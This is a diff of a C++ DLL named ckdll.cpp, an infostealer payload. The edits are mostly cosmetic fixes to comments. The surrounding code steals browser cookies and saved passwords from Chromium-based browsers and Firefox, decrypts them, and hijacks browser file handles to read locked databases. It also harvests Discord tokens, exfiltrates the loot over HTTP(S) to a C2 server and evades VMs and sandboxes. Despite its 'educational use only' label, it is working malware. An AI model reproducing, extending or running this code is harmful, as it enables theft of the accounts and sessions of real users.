@@ -1,4 +1,4 @@
-// ckdll.cpp - payload DLL: extracts cookies (Firefox plaintext + Chromium v10/v11/v20)
+// ckdll.cpp -- payload DLL: extracts cookies (Firefox plaintext + Chromium v10/v11/v20)
 //   and exfiltrates them as Cookie-Editor JSON via HTTP POST (Winsock2) or local fallback.
 //
 //   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
@@ -59,7 +59,7 @@ extern "C" void* memset(void* d, int c, size_t n){ unsigned char*a=(unsigned cha
 extern "C" int memcmp(const void* a, const void* b, size_t n){
     const unsigned char* p=(const unsigned char*)a; const unsigned char* q=(const unsigned char*)b;
     for(size_t i=0;i<n;i++){ if(p[i]!=q[i]) return (int)p[i]-(int)q[i]; } return 0; }
-// strchr/strstr: without CRT we implement locally with custom names to avoid header conflict
+// strchr/strstr: without CRT we implement locally with custom names to avoid header conflict.
 static const char* xstrchr(const char* s, int c){ for(; *s; s++) if(*s==(char)c) return s; return 0; }
 static const char* xstrstr(const char* s, const char* sub){
     if(!*sub) return s;
@@ -91,13 +91,13 @@ static char g_skip_av[8] = {'C','K','A','V','0','0','0','0'};
 static char*  g_out = NULL;
 static size_t g_cap = 0;
 static size_t g_len;
-static bool   g_first_rec = true;                          // controls comma in JSON array
+static bool   g_first_rec = true;                          // Controls comma in JSON array
 // Chunked exfil: every record starts at a byte offset, so the dump can be split
 // on record boundaries and POSTed as several envelopes without re-serialising.
 #define CK_MAX_REC 16384
 static size_t g_rec_off[CK_MAX_REC];
 static int    g_rec_n;
-static size_t g_rec_end;                                    // offset of the closing "]"
+static size_t g_rec_end;                                    // Offset of the closing "]"
 static void Grow(size_t need){
     if(!g_out){
         g_cap = 2048*1024;
@@ -107,7 +107,7 @@ static void Grow(size_t need){
     while(g_cap < g_len + need + 2){
         size_t nc = g_cap * 2;
         char* nb = (char*)VirtualAlloc(NULL, nc, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-        if(!nb) return;                                    // keep old buffer, Put drops the tail
+        if(!nb) return;                                    // Keep old buffer, Put drops the tail
         memcpy(nb, g_out, g_len);
         VirtualFree(g_out, 0, MEM_RELEASE);
         g_out = nb; g_cap = nc;
@@ -115,14 +115,14 @@ static void Grow(size_t need){
 }
 static void Put(const char* s, size_t n){
     // g_cap==0 must force Grow: g_cap-1 would underflow to SIZE_MAX and the
-    // write below would memcpy into a NULL buffer (crash on the first PutS)
+    // write below would memcpy into a NULL buffer (crash on the first PutS).
     if(!g_out || g_len + n >= g_cap - 1) Grow(n);
     if(g_out && g_len + n < g_cap - 1){ memcpy(g_out+g_len,s,n); g_len+=n; }
 }
 static void PutS(const char* s){ Put(s, lstrlenA(s)); }
 static void RecStart(void){
-    // offset points at the '{' of the record (the separator comma is written
-    // before it and excluded), so a chunk slice is valid JSON on its own
+    // Offset points at the '{' of the record (the separator comma is written
+    // before it and excluded), so a chunk slice is valid JSON on its own.
     if(g_first_rec){
         if(g_rec_n < CK_MAX_REC){ g_rec_off[g_rec_n] = g_len; g_rec_n++; }
         PutS("{"); g_first_rec=false;
@@ -132,7 +132,7 @@ static void RecStart(void){
         PutS("{");
     }
 }
-static void PutJ(const char* s, int n){            // escape string for JSON
+static void PutJ(const char* s, int n){            // Escape string for JSON
     PutS("\"");
     int run = 0;
     for(int i=0;i<n;i++){ unsigned char c=(unsigned char)s[i];
@@ -145,7 +145,7 @@ static void PutJ(const char* s, int n){            // escape string for JSON
             run=i+1;
         }
     }
-    if(n>run) Put(s+run,n-run);              // bytes >= 0x80: pass through as UTF-8
+    if(n>run) Put(s+run,n-run);              // Bytes >= 0x80: pass through as UTF-8
     PutS("\"");
 }
 static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return; }
@@ -154,10 +154,10 @@ static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return;
     if(neg) b[i--]='-';
     Put(b+i+1, 20-i); }
 
-// ------------------------------------------------------------------ debug logging
+// ------------------------------------------------------------------ Debug logging
 #ifdef DEBUG
-// crash locator: log the faulting address (base-relative) so it can be resolved
-// against the map file -- temporary diagnosis for the HijackCookieDB call crash
+// Crash locator: log the faulting address (base-relative) so it can be resolved
+// against the map file -- temporary diagnosis for the HijackCookieDB call crash.
 static void* g_imgbase = 0;
 static LONG CALLBACK CrashVEH(EXCEPTION_POINTERS* e){
     HANDLE h = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
@@ -180,7 +180,7 @@ static void Dbg(const char* msg){
     HANDLE h=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
     if(h==INVALID_HANDLE_VALUE)
-        // test environments with restricted ProgramData: fall back to the working dir
+        // Test environments with restricted ProgramData: fall back to the working dir.
         h=CreateFileW(L"_ck_trace.log",GENERIC_WRITE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
     if(h!=INVALID_HANDLE_VALUE){
@@ -192,7 +192,7 @@ static void Dbg(const char* msg){
 }
 // DbgH: inline debug logging macro for use in CopyDb/HijackCookieDB.
 // Dbg() fails when called from CopyDb (5-param function) in the hollowed
-// process — likely a compiler codegen issue with /Od and /NODEFAULTLIB.
+// process -- likely a compiler codegen issue with /Od and /NODEFAULTLIB.
 // This macro inlines the file write, avoiding the function call entirely.
 #ifdef DEBUG
 #define DbgH(msg) do { \
@@ -243,7 +243,7 @@ static void DbgInt(const char* msg, int val){
 #define DbgHInt(x,y) do{}while(0)
 #endif
 
-// ------------------------------------------------------------------ dynamically-loaded APIs
+// ------------------------------------------------------------------ Dynamically-loaded APIs
 static HMODULE g_sql, g_c32;
 typedef int  (__cdecl *tOpenV2)(const char*,void**,int,const char*);
 typedef int  (__cdecl *tPrep16)(void*,const void*,int,void**,const void**);
@@ -255,7 +255,7 @@ static tOpenV2 S_open; static tPrep16 S_prep; static tStep S_step; static tInt S
 static tInt64 S_int64;
 static tBlob S_blob; static tBytes S_bytes; static tFin S_fin; static tClose S_close;
 
-// NtQuerySystemInformation for handle hijacking (loaded from ntdll.dll at runtime)
+// NtQuerySystemInformation for handle hijacking (loaded from ntdll.dll at runtime).
 typedef LONG (WINAPI *tNtQSI)(ULONG, PVOID, ULONG, PULONG);
 static tNtQSI NtQSI = NULL;
 
@@ -273,7 +273,7 @@ static bool Sqlite(void){
     return S_open && S_prep && S_step && S_blob && S_int64;
 }
 
-// DPAPI (CryptUnprotectData) - used for Chromium v10/v11 cookie key
+// DPAPI (CryptUnprotectData) - used for Chromium v10/v11 cookie key.
 static bool Dpapi(const unsigned char* in, DWORD nin, unsigned char* out, DWORD* nout, bool machine){
     g_c32 = g_c32 ? g_c32 : LoadLibraryA("crypt32.dll"); if(!g_c32) return false;
     typedef BOOL (WINAPI *tCU)(DATA_BLOB*,LPWSTR*,DATA_BLOB*,void*,void*,DWORD,DATA_BLOB*);
@@ -306,7 +306,7 @@ static bool AesGcm(const unsigned char* key, ULONG klen, const unsigned char* iv
             g_aes_alg = NULL;
         }
     }
-    if(!g_aes_alg) return false;             // cached for the process lifetime
+    if(!g_aes_alg) return false;             // Cached for the process lifetime
     BCRYPT_KEY_HANDLE k=NULL;
     st = BCryptGenerateSymmetricKey(g_aes_alg,&k,NULL,0,(PUCHAR)key,klen,0);
     if(st){ DbgInt("AesGcm: GenKey failed", st); return false; }
@@ -331,7 +331,7 @@ static void FieldS(const char* k, void* st, int col){
     const char* t = (const char*) S_blob(st,col); int n = S_bytes(st,col);
     PutS(",\""); PutS(k); PutS("\":"); if(t&&n>0) PutJ(t,n); else PutS("\"\"");
 }
-// FieldS0: first field of a record (no leading comma)
+// FieldS0: first field of a record (no leading comma).
 static void FieldS0(const char* k, void* st, int col){
     const char* t = (const char*) S_blob(st,col); int n = S_bytes(st,col);
     PutS("\""); PutS(k); PutS("\":"); if(t&&n>0) PutJ(t,n); else PutS("\"\"");
@@ -339,7 +339,7 @@ static void FieldS0(const char* k, void* st, int col){
 static void FieldStr(const char* k, const char* v){ PutS(",\""); PutS(k); PutS("\":\""); PutS(v); PutS("\""); }
 static void FieldB(const char* k, int v){ PutS(",\""); PutS(k); PutS("\":"); PutS(v?"true":"false"); }
 
-// Convert wide string to UTF-8; fallback to ASCII replacement
+// Convert wide string to UTF-8; fallback to ASCII replacement.
 static int ToUtf8(const wchar_t* p, char* out, int cap){
     int n = WideCharToMultiByte(CP_UTF8, 0, p, -1, out, cap, NULL, NULL);
     if(n > 0) return n-1;
@@ -363,7 +363,7 @@ static bool LooksUtf8(const char* s, int n){
     return true;
 }
 
-// ------------------------------------------------------------------ coverage manifest
+// ------------------------------------------------------------------ Coverage manifest
 // One row per database file the payload actually opened. The listener turns
 // these into loot/coverage.jsonl: rows vs decrypted vs failed, plus a fixed
 // skip reason (missing, locked, no-key, v10-fail, unsupported, excluded).
@@ -393,14 +393,14 @@ static void SrcAdd(const char* kind, const wchar_t* browser, const wchar_t* prof
     lstrcpynA(s->skip, skip ? skip : "", sizeof(s->skip));
 }
 
-// ------------------------------------------------------------------ handle hijacking
+// ------------------------------------------------------------------ Handle hijacking
 // When a browser holds a 0-sharing lock on the cookie/password DB, CreateFileW
 // fails with error 32 (sharing violation). This function enumerates all system
 // handles via NtQuerySystemInformation(SystemExtendedHandleInformation=0x40),
 // finds the browser's SQLite DB handle, duplicates it with DUPLICATE_SAME_ACCESS,
 // reads the file, and verifies it has the expected table (cookies/logins).
 
-// Find PIDs of a process by exe name (e.g., L"vivaldi.exe")
+// Find PIDs of a process by exe name (e.g., L"vivaldi.exe").
 static int FindPids(const wchar_t* exe_name, DWORD* pids, int max_pids){
     int count = 0;
     HANDLE snap = CreateToolhelp32Snapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
@@ -454,7 +454,7 @@ static void DeleteDbCopy(const wchar_t* dst){
 }
 
 // Hijack a SQLite DB handle from a running browser process.
-// exe_name: e.g. L"vivaldi.exe" â€” used to find browser PIDs
+// exe_name: e.g. L"vivaldi.exe" -- used to find browser PIDs
 // dst: temp file path to write the DB to
 // table_name: expected SQLite table name (L"cookies" or L"logins")
 // Returns true if a DB with the expected table was found and written to dst.
@@ -481,7 +481,7 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
     char* buf = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if(!buf) return false;
     LONG status = NtQSI(0x40, buf, bufSize, &actual);
-    if(status == 0xC0000004){ // STATUS_INFO_LENGTH_MISMATCH â€” need bigger buffer
+    if(status == 0xC0000004){ // STATUS_INFO_LENGTH_MISMATCH -- need bigger buffer
         VirtualFree(buf, 0, MEM_RELEASE);
         bufSize = actual + 0x1000;
         buf = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -496,14 +496,14 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
     unsigned __int64 count = *(unsigned __int64*)buf;
     DbgHInt("HijackCookieDB: total handles (low32)", (int)(count & 0xFFFFFFFF));
 
-    HandleEntryEx* entries = (HandleEntryEx*)(buf + 16); // skip 16-byte header
+    HandleEntryEx* entries = (HandleEntryEx*)(buf + 16); // Skip 16-byte header
 
-    // 4. Scan handles â€” find SQLite DB in browser process
+    // 4. Scan handles -- find SQLite DB in browser process
     for(unsigned __int64 i = 0; i < count; i++){
         HandleEntryEx* e = &entries[i];
         if(e->UniqueProcessId == 0 || e->UniqueProcessId == 4) continue;
 
-        // Check if PID matches a browser process
+        // Check if PID matches a browser process.
         bool match = false;
         for(int p = 0; p < npids; p++){
             if(e->UniqueProcessId == pids[p]){ match = true; break; }
@@ -537,7 +537,7 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
             CloseHandle(dup); CloseHandle(hProc); continue;
         }
 
-        // Found a SQLite DB â€” check size
+        // Found a SQLite DB -- check size.
         DWORD fsize = GetFileSize(dup, NULL);
         DbgHInt("HijackCookieDB: SQLite DB found, size", (int)fsize);
         if(fsize < 50000 || fsize > 50000000){
@@ -571,7 +571,7 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
         CloseHandle(hOut); CloseHandle(dup); CloseHandle(hProc);
         if(!readOk){ DbgH("HijackCookieDB: read failed"); continue; }
 
-        // Verify the expected table exists
+        // Verify the expected table exists.
         char path8[1024]; ToUtf8(dst, path8, sizeof(path8));
         void* con = NULL; int rc = S_open(path8, &con, 1/*SQLITE_OPEN_READONLY*/, NULL);
         if(rc || !con){ if(con) S_close(con); DbgHInt("HijackCookieDB: sqlite open failed", rc); continue; }
@@ -607,7 +607,7 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if(hIn == INVALID_HANDLE_VALUE){
         DbgInt("CopyFileShared: CreateFileW failed (err)", GetLastError());
-        // File is exclusively locked (0 sharing) â€” browser must be closed.
+        // File is exclusively locked (0 sharing) -- browser must be closed.
         // esentutl /vss was tried but hangs without admin/VSS service.
         // Firefox cookies still work (Firefox doesn't hold exclusive locks).
         return false;
@@ -622,7 +622,7 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
     for(;;){
         DWORD nRead=0;
         if(!ReadFile(hIn,buf,sizeof(buf),&nRead,NULL)){ ok=false; break; }
-        if(nRead==0) break;                         // only a successful zero read is EOF
+        if(nRead==0) break;                         // Only a successful zero read is EOF
         DWORD nWritten=0;
         if(!WriteFile(hOut,buf,nRead,&nWritten,NULL) || nWritten!=nRead){ ok=false; break; }
     }
@@ -634,7 +634,7 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
 
 // Copy a SQLite database (and -wal/-shm companions) to a unique temporary path.
 // Uses CopyFileShared to bypass browser file locks (Chrome/Edge hold exclusive
-// locks on live cookie DBs; CopyFileW fails, but CreateFileW with FILE_SHARE_WRITE works)
+// locks on live cookie DBs; CopyFileW fails, but CreateFileW with FILE_SHARE_WRITE works).
 static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
                    const wchar_t* exe_name, const wchar_t* table_name){
     wchar_t tmp[MAX_PATH]; DWORD tn=GetTempPathW(MAX_PATH, tmp);
@@ -642,7 +642,7 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
     DeleteDbCopy(dst);
     DbgH("CopyDb: calling CopyFileShared");
     if(!CopyFileShared(src, dst)){
-        // Browser holds 0-sharing lock â€” try handle hijack
+        // Browser holds 0-sharing lock -- try handle hijack.
         DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
         if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name))
             DbgH("CopyDb: handle hijack OK");
@@ -666,7 +666,7 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
     return true;
 }
 
-// ------------------------------------------------------------------ browser profiles
+// ------------------------------------------------------------------ Browser profiles
 struct Br { const wchar_t* name; const wchar_t* rel; const wchar_t* exe; };
 static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data",           L"chrome.exe"},
                      {L"edge",    L"\\Microsoft\\Edge\\User Data",          L"msedge.exe"},
@@ -693,8 +693,8 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     HANDLE h = CreateFileW(ls,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
     if(h==INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no Local State, return"); return; }
     Dbg("LoadLocalState: reading file");
-    // size-based read: Local State regularly exceeds 256 KB on heavy profiles
-    // (extensions, histograms) and the old fixed 256 KB buffer cut os_crypt off
+    // Size-based read: Local State regularly exceeds 256 KB on heavy profiles
+    // (extensions, histograms) and the old fixed 256 KB buffer cut os_crypt off.
     LARGE_INTEGER fsz;
     if(!GetFileSizeEx(h,&fsz) || fsz.QuadPart <= 0 || fsz.QuadPart > 8*1024*1024){
         CloseHandle(h); Dbg("LoadLocalState: bad size"); return;
@@ -738,15 +738,15 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
             lstrcatW(kp, L".key");
             HANDLE k = CreateFileW(kp, GENERIC_READ, FILE_SHARE_READ, NULL,
                                    OPEN_EXISTING, 0, NULL);
-            if(k == INVALID_HANDLE_VALUE)                            // legacy single key
+            if(k == INVALID_HANDLE_VALUE)                            // Legacy single key
                 k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
                                 FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
             if(k == INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no v20 key file"); continue; }
             char b[96]; memset(b, 0, sizeof(b)); DWORD r2 = 0;
             ReadFile(k, b, sizeof(b)-1, &r2, NULL); CloseHandle(k);
-            if(r2 == 32){                                            // raw key
+            if(r2 == 32){                                            // Raw key
                 memcpy(g_key20, b, 32); g_has20 = true;
-            } else if(r2 > 32){                                      // base64 key
+            } else if(r2 > 32){                                      // Base64 key
                 DWORD kl = 32;
                 if(CryptStringToBinaryA(b, 0, CRYPT_STRING_BASE64, g_key20, &kl, NULL, NULL))
                     g_has20 = (kl == 32);
@@ -782,7 +782,7 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
             DbgInt("LoadLocalState: v10 raw len", rl);
             DbgInt("LoadLocalState: v10 raw[0]", raw[0]);
             if(raw[0]=='D'&&raw[1]=='P'&&raw[2]=='A'&&raw[3]=='P'&&raw[4]=='I'){
-                // DPAPI prefix (5 bytes) + encrypted key blob
+                // DPAPI prefix (5 bytes) + encrypted key blob.
                 DWORD outlen = sizeof(g_key10);
                 g_has10 = Dpapi(raw+5, rl-5, g_key10, &outlen, false) && outlen>=16;
                 DbgInt("LoadLocalState: Dpapi result", g_has10?1:0);
@@ -790,7 +790,7 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
                 if(g_has10) DbgInt("LoadLocalState: key10[0]", g_key10[0]);
             } else {
                 Dbg("LoadLocalState: raw does not start with DPAPI, trying direct");
-                // Some versions store the key without DPAPI wrapping
+                // Some versions store the key without DPAPI wrapping.
                 if(rl>=32){ memcpy(g_key10,raw,32); g_has10=true; Dbg("LoadLocalState: v10 direct key OK"); }
                 else { Dbg("LoadLocalState: v10 key too short, no DPAPI prefix"); }
             }
@@ -800,8 +800,8 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     Dbg("LoadLocalState: done");
 }
 
-// SHA-256 via CNG (BCrypt) - used to verify cookie domain hash prefix
-static void Sha256Hash(const unsigned char* data,unsigned int len,unsigned char*out32); // defined below
+// SHA-256 via CNG (BCrypt) - used to verify cookie domain hash prefix.
+static void Sha256Hash(const unsigned char* data,unsigned int len,unsigned char*out32); // Defined below
 static bool Sha256(const unsigned char* data, ULONG len, unsigned char* out32){
     Sha256Hash(data, len, out32);
     return true;
@@ -878,7 +878,7 @@ static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* 
     if(got >= 32 && host_key){
         unsigned char h[32];
         Sha256Hash((const unsigned char*)host_key, (unsigned int)lstrlenA(host_key), h);
-        if(memcmp(out, h, 32) == 0) s = 32;  // hash matches - strip it
+        if(memcmp(out, h, 32) == 0) s = 32;  // Hash matches - strip it
     }
     *on = (int)(got - s); memmove(out, out+s, *on); return true;
 }
@@ -925,7 +925,7 @@ static void DumpChromiumDb(const wchar_t* brname, const wchar_t* profile,
         }
         else { PutS(",\"value\":\"\""); failed++; }
         if(pt) VirtualFree(pt, 0, MEM_RELEASE);
-        // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
+        // expires_utc: 64-bit microseconds since 1601 -> Unix epoch.
         long long eu = S_int64(st,4);
         long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
         PutS(",\"expirationDate\":"); PutN(unix);
@@ -936,7 +936,7 @@ static void DumpChromiumDb(const wchar_t* brname, const wchar_t* profile,
         FieldStr("sameSite", ss==0 ? "None" : (ss==2 ? "Strict" : "Lax"));
         FieldB("secure",S_int(st,5));
         FieldB("httpOnly",S_int(st,6));
-        // hostOnly: true if domain does not start with "."
+        // hostOnly: true if domain does not start with ".".
         { const char* d=(const char*)S_blob(st,0); FieldB("hostOnly", d && d[0]!='.'); }
         FieldB("session", unix==0);
         PutS("}");
@@ -961,7 +961,7 @@ static void DumpChromium(const wchar_t* brname, const wchar_t* root,
         if(GetFileAttributesW(db)!=INVALID_FILE_ATTRIBUTES)
             DumpChromiumDb(brname, L".", db, exe, kind);
     }
-    // FindFirstFile only accepts wildcards in the LAST path component; enumerate profiles first
+    // FindFirstFile only accepts wildcards in the LAST path component; enumerate profiles first.
     wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
     WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
     if(f==INVALID_HANDLE_VALUE) return;
@@ -995,7 +995,7 @@ static int Lz4Block(const unsigned char* src, int slen, unsigned char* dst, int 
         }
         if(si+lit>slen || di+lit>dcap) return -1;
         memcpy(dst+di, src+si, (size_t)lit); si+=lit; di+=lit;
-        if(si >= slen) break;                       // last sequence: literals only
+        if(si >= slen) break;                       // Last sequence: literals only
         if(si+2 > slen) return -1;
         int off = (int)src[si] | ((int)src[si+1]<<8); si+=2;
         if(off==0 || off>di) return -1;
@@ -1252,7 +1252,7 @@ static void DumpFirefox(const wchar_t* appdata, bool notice){
                             long long expiry = S_int64(st,4);
                             PutS(",\"expirationDate\":"); PutN(expiry);
                             int ss = S_int(st,7);
-                            // moz_cookies.sameSite: 0=None/no-restriction, 1=Lax, 2=Strict
+                            // moz_cookies.sameSite: 0=None/no-restriction, 1=Lax, 2=Strict.
                             FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
                             FieldB("secure",S_int(st,5));
                             FieldB("httpOnly",S_int(st,6));
@@ -1302,7 +1302,7 @@ static bool AcceptToken(const char* t, int n){
         if(t[i]=='.'){ if(k<3) s[k]=seg; k++; seg=0; }
         else seg++;
     }
-    if(k != 2) return false;                       // exactly three parts
+    if(k != 2) return false;                       // Exactly three parts
     s[2] = seg;
     return s[0] >= 23 && s[0] <= 30 && s[1] >= 5 && s[1] <= 8 && s[2] >= 25 && s[2] <= 45;
 }
@@ -1310,7 +1310,7 @@ static bool AcceptToken(const char* t, int n){
 static void ScanTokens(const char* buf, int n){
     for(int i=0; i<n; i++){
         if(!IsTokChar((unsigned char)buf[i])) continue;
-        if(i > 0 && IsTokChar((unsigned char)buf[i-1])) continue;  // only at a run start
+        if(i > 0 && IsTokChar((unsigned char)buf[i-1])) continue;  // Only at a run start
         int j = i;
         while(j < n && IsTokChar((unsigned char)buf[j])) j++;
         int len = j - i;
@@ -1383,7 +1383,7 @@ static void DumpDiscordTokens(const wchar_t* appdata){
 
 // ------------------------------------------------------------------ Browser saved passwords (Chromium Login Data)
 // Same AES-256-GCM encryption as cookies, same key (v10/v11/v20).
-// Path: <profile>\Login Data (SQLite: logins table)
+// Path: <profile>\Login Data (SQLite: logins table).
 static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
                            const wchar_t* prof, const wchar_t* exe){
     Dbg("DumpPasswords: entry");
@@ -1455,14 +1455,14 @@ static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
             }
         }
         else{
-            // Decryption failed â€” write empty value instead of raw encrypted bytes
-            // (raw v10 blobs are useless and pollute the JSON with binary garbage)
+            // Decryption failed -- write empty value instead of raw encrypted bytes
+            // (raw v10 blobs are useless and pollute the JSON with binary garbage).
             pwd_len = 0;
             dec_fail++;
         }
 
         RecStart();
-        // Store as a cookie-like entry for easy exfil
+        // Store as a cookie-like entry for easy exfil.
         PutS("\"domain\":"); PutJ(url, url_len);
         PutS(",\"name\":\"password\"");
         { char b8[64]; int bl=ToUtf8(name,b8,sizeof(b8));
@@ -1517,12 +1517,12 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
 // every send()/recv() on it failed -- the dump stayed on the victim.
 typedef UINT_PTR CK_SOCKET;
 #define CK_INVALID_SOCKET ((CK_SOCKET)(~0))
-struct CK_WSADATA { char _[512]; };  // real WSADATA is 408 bytes; 400 overflowed the stack
+struct CK_WSADATA { char _[512]; };  // Real WSADATA is 408 bytes; 400 overflowed the stack
 #pragma pack(push,1)
 struct CK_SOCKADDR_IN {
     short sin_family;       // AF_INET = 2
-    unsigned short sin_port; // network byte order (htons)
-    unsigned long sin_addr;  // network byte order (inet_addr)
+    unsigned short sin_port; // Network byte order (htons)
+    unsigned long sin_addr;  // Network byte order (inet_addr)
     char sin_zero[8];
 };
 #pragma pack(pop)
@@ -1547,7 +1547,7 @@ static bool ParseC2(const char* url, char* host, int hostcap, int* port,
     *tls = false;
     if((p[0]=='h'||p[0]=='H') && (p[1]=='t'||p[1]=='T') && (p[2]=='t'||p[2]=='T') &&
        (p[3]=='p'||p[3]=='P')){
-        p += 4;                                   // past "http"
+        p += 4;                                   // Past "http"
         if(*p=='s' || *p=='S'){ *tls = true; p++; }
         if(*p==':') p++;
         if(p[0]=='/' && p[1]=='/') p += 2;
@@ -1742,7 +1742,7 @@ static bool TlsHandshake(CkTls* t, CK_SOCKET s, const char* host, tCkSend fSend,
 }
 
 static bool HttpStatusOk(const char* p, int n){
-    // "HTTP/1.1 200" / "HTTP/1.0 200": bytes 8..11 are " 200"
+    // "HTTP/1.1 200" / "HTTP/1.0 200": bytes 8..11 are " 200".
     return n >= 12 && p[0]=='H' && p[1]=='T' && p[2]=='T' && p[3]=='P' && p[4]=='/' &&
            p[8]==' ' && p[9]=='2' && p[10]=='0' && p[11]=='0';
 }
@@ -1852,7 +1852,7 @@ static void TlsTeardown(CkTls* t, CK_SOCKET s, tCkSend fSend, bool send_close){
     }
 }
 
-// ------------------------------------------------------------------ request framing
+// ------------------------------------------------------------------ Request framing
 static int AppStr(char* dst, int cap, int pos, const char* s){
     int n = lstrlenA(s);
     if(pos + n > cap) n = cap - pos;
@@ -2078,7 +2078,7 @@ static bool ExfilHTTP(const char* url){
     return sent_ok;
 }
 
-// ------------------------------------------------------------------ exfiltration sink
+// ------------------------------------------------------------------ Exfiltration sink
 // Stage-2 wire shape: {"records":[...],"coverage":{...}}. The listener accepts
 // both this and the bare list, so an old payload still lands.
 static long long NowUnix(void){
@@ -2091,7 +2091,7 @@ static void EmitCoverage(void){
     VictimName();
     PutS(",\"coverage\":{\"ts\":"); PutN(NowUnix());
     PutS(",\"host\":"); PutJ(g_victim, lstrlenA(g_victim));
-    // run id: pid is enough to tell two executions apart on one host
+    // Run id: pid is enough to tell two executions apart on one host.
     PutS(",\"run\":\"r"); PutN((long long)GetCurrentProcessId()); PutS("\"");
     PutS(",\"sources\":[");
     for(int i=0;i<g_src_n;i++){
@@ -2129,12 +2129,12 @@ static bool WriteLocalLoot(const wchar_t* dir, const wchar_t* path){
     return true;
 }
 
-// Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
+// Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file.
 static bool Sink(void){
-    g_rec_end = g_len;                                  // chunk splitter stops here
+    g_rec_end = g_len;                                  // Chunk splitter stops here
     PutS("]");
     EmitCoverage();
-    if(g_out) g_out[g_len]=0; else return false;   // nothing was ever buffered (OOM)
+    if(g_out) g_out[g_len]=0; else return false;   // Nothing was ever buffered (OOM)
 
     // 1. If C2 URL is configured (sentinel replaced by pick.py), exfiltrate via HTTP
     bool is_c2_configured = (g_c2_url[0]!='C' || g_c2_url[1]!='K' || g_c2_url[2]!='C' || g_c2_url[3]!='2');
@@ -2143,7 +2143,7 @@ static bool Sink(void){
         bool ok = ExfilHTTP(g_c2_url);
         Dbg(ok?"Sink: HTTP OK":"Sink: HTTP FAILED");
         if(ok) return true;
-        // fall through to local fallback if HTTP fails
+        // Fall through to local fallback if HTTP fails.
     } else {
         Dbg("Sink: no C2 URL configured, skipping HTTP");
     }
@@ -2153,7 +2153,7 @@ static bool Sink(void){
         HANDLE p = CreateFileW(L"\\\\.\\pipe\\ck_pipe",GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
         if(p!=INVALID_HANDLE_VALUE){
             // WriteFile on a pipe can return short; the old single call dropped
-            // the tail of any dump bigger than one pipe buffer and reported fail
+            // the tail of any dump bigger than one pipe buffer and reported fail.
             DWORD wrote=0; bool ok=true;
             while(wrote < (DWORD)g_len){
                 DWORD w=0;
@@ -2176,7 +2176,7 @@ static bool Sink(void){
 // Returns true if the payload appears to be running in a VM or sandbox.
 // If so, the payload exits silently without extracting cookies.
 static bool IsAnalysisEnv(void){
-    // Check anti-VM skip sentinel (patched to "CKAV0001" by --no-anti-vm)
+    // Check anti-VM skip sentinel (patched to "CKAV0001" by --no-anti-vm).
     if(g_skip_av[4]=='0' && g_skip_av[5]=='0' && g_skip_av[6]=='0' && g_skip_av[7]=='1'){
         Dbg("IsAnalysisEnv: SKIPPED (CKAV0001 — anti-VM disabled)");
         return false;
@@ -2188,7 +2188,7 @@ static bool IsAnalysisEnv(void){
     // VMware: 00:0C:29, 00:50:56, 00:05:69
     // VirtualBox: 08:00:27, 0A:00:27
     // QEMU: 52:54:00
-    // (Hyper-V 00:15:5D excluded â€” WSL creates a Hyper-V virtual adapter on real machines)
+    // (Hyper-V 00:15:5D excluded -- WSL creates a Hyper-V virtual adapter on real machines).
     IP_ADAPTER_INFO adapter[16];
     ULONG bufLen = sizeof(adapter);
     HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
@@ -2207,11 +2207,11 @@ static bool IsAnalysisEnv(void){
